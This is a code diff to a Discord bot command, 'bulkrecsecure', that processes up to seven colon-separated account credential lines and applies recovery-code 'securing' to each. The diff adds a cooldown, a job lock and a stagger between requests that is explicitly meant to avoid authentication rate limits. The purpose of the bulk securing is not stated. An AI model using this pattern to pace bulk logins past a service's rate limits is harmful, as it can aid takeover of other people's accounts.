@@ -3,14 +3,35 @@ const recoverycodesecure = require('../../utils/secure/recoveryCodeSecure');
 const generate = require('../../utils/generate');
 const { queryParams } = require('../../../db/database');
 const { domains } = require('../../../config.json');
+const { checkCooldown, startCooldown, acquireLock, releaseLock } = require('../../../mainbot/utils/cooldownGuard');
 
 const MAX_BULK = 7;
+const BULK_COOLDOWN_MS = 15 * 1000;
+const STAGGER_MS = 350;
 
 module.exports = {
     name: "bulkrecsecure",
     userOnly: true,
     callback: async (client, interaction) => {
+        let lockKey = null;
         try {
+            const cooldownKey = `bulkrec:${interaction.user.id}`;
+            const cd = checkCooldown(cooldownKey, BULK_COOLDOWN_MS);
+            if (!cd.allowed) {
+                return interaction.reply({
+                    content: `⏳ Please wait **${cd.retryAfterSec}s** before starting another bulk recovery run.`,
+                    ephemeral: true
+                });
+            }
+
+            lockKey = `bulkrec_lock:${interaction.user.id}`;
+            if (!acquireLock(lockKey)) {
+                return interaction.reply({
+                    content: '⏳ You already have a bulk recovery job running. Please wait for it to finish.',
+                    ephemeral: true
+                });
+            }
+
             await interaction.deferReply({ ephemeral: true });
 
             // Settings lookup uses interaction.user.id (the Discord user), not client.username (the bot account)
@@ -45,8 +66,9 @@ module.exports = {
                 }]
             });
 
-            // Process all accounts concurrently
+            // Process accounts with gentle stagger to avoid auth rate-limit bursts
             const securePromises = accountLines.map(async (line, i) => {
+                if (i > 0) await new Promise(r => setTimeout(r, i * STAGGER_MS));
                 const parts = line.split(':');
                 if (parts.length < 2) {
                     return interaction.user.send({
@@ -146,6 +168,7 @@ module.exports = {
             });
 
             await Promise.all(securePromises);
+            startCooldown(`bulkrec:${interaction.user.id}`, BULK_COOLDOWN_MS);
 
             await interaction.editReply({
                 embeds: [{
@@ -164,6 +187,8 @@ module.exports = {
                     await interaction.reply({ content: 'An unexpected error occurred.', ephemeral: true });
                 }
             } catch (_) {}
+        } finally {
+            if (lockKey) releaseLock(lockKey);
         }
     }
 };
